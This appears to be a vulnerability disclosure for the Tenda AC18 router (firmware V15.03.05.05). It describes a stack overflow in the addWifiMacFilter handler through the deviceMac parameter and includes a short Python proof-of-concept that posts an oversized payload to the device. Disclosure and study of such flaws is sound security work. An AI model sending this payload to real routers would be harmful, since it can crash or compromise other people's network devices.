## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `addWifiMacFilter` function. The `v11` variable receives the `deviceMac` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `deviceMac` can trigger this security vulnerability.

![image-20240306165547354](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306165547354.png)

![image-20240306165556643](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306165556643.png)

![image-20240306165606917](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306165606917.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addWifiMacFilter"
payload = b"a"*1000

data = {"deviceMac": payload, "deviceId":1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240306165755915](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306165755915.png)
